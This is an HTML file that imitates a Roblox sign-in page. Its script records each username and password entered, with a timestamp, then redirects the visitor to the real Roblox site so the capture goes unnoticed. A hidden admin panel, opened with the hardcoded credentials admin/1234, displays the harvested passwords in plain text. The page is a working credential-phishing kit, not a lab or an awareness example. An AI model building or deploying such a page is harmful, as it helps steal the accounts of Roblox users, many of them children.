<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Sign In</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .admin-container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 500px;
            text-align: center;
            display: none;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 150px;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .sign-in-btn {
            background-color: #ff0000;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }
        .sign-in-btn:hover {
            background-color: #e60000;
        }
        .forgot-password {
            margin-top: 10px;
            color: #0073e6;
            cursor: pointer;
        }
        .log-list {
            text-align: left;
            margin-top: 20px;
        }
        .log-item {
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container" id="login-container">
        <div class="logo">
            <img src="https://i.pinimg.com/originals/5d/1e/90/5d1e9035ac4ddf5f7c06ee10babdc4c9.webp" alt="Roblox Logo">
        </div>
        <form onsubmit="handleLogin(event)">
            <div class="input-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="sign-in-btn">Sign In</button>
        </form>
        <div class="forgot-password">Forgot Password?</div>
    </div>
    <div class="admin-container" id="admin-container">
        <h2>Admin Panel</h2>
        <button onclick="clearLogs()">Clear Logs</button>
        <div class="log-list" id="log-list"></div>
        <button onclick="logout()">Logout</button>
    </div>
    <script>
        const ADMIN_USERNAME = 'admin';
        const ADMIN_PASSWORD = '1234';

        function handleLogin(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Log the login attempt with timestamp
            logLogin(username, password);

            if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
                showAdminPanel();
            } else {
                window.location.href = 'https://www.roblox.com';
            }
        }

        function logLogin(username, password) {
            const logs = JSON.parse(localStorage.getItem('loginLogs')) || [];
            const timestamp = new Date().toLocaleString('en-US', { timeZone: 'America/New_York', hour12: true });
            const newLog = { username, password, timestamp };
            logs.push(newLog);
            localStorage.setItem('loginLogs', JSON.stringify(logs));
        }

        function showAdminPanel() {
            document.getElementById('login-container').style.display = 'none';
            const adminContainer = document.getElementById('admin-container');
            adminContainer.style.display = 'block';
            const logList = document.getElementById('log-list');
            const logs = JSON.parse(localStorage.getItem('loginLogs')) || [];
            logList.innerHTML = logs.map(log => `<div class="log-item">[${log.timestamp}] Username: ${log.username}, Password: ${log.password}</div>`).join('');
        }

        function clearLogs() {
            localStorage.removeItem('loginLogs');
            document.getElementById('log-list').innerHTML = '';
        }

        function logout() {
            document.getElementById('login-container').style.display = 'block';
            document.getElementById('admin-container').style.display = 'none';
        }
    </script>
</body>
</html>
